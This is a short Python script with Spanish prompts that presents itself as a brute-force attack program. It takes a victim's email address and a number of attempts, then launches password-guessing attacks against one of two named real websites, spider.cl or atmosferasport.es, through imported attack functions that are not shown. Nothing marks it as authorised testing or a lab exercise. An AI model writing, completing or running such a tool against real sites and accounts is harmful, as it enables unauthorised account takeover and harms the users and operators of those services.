from functions import *

flag = True
while(flag):
    print("Bienvenido!!\n")
    print("Este programa hace ataques de fuerza bruta\n")
    print("Seleccione una opcion\n")
    print("1) Realizar ataque\n2) Salir\n")
    opcion = input()

    if(opcion == '1'):
        correo = input("\nIngrese el correo de usuario:\n")
        intentos = int(input("Ingrese la cantidad de intentos:\n"))
        print("Que página desea atacar:\n")
        pagina = input("1) spider.cl\n2) atmosferasport.es\n")
        if (pagina == '1'):
            ataque_spider(correo, intentos)

        elif(pagina == '2'):
            ataque_atmosferasport(correo,intentos)
        
        else:
            print("Opcion invalida")
            continue
        
    elif(opcion == '2'):
        flag = False
    else:
        print("Seleccione una opcion valida\n")
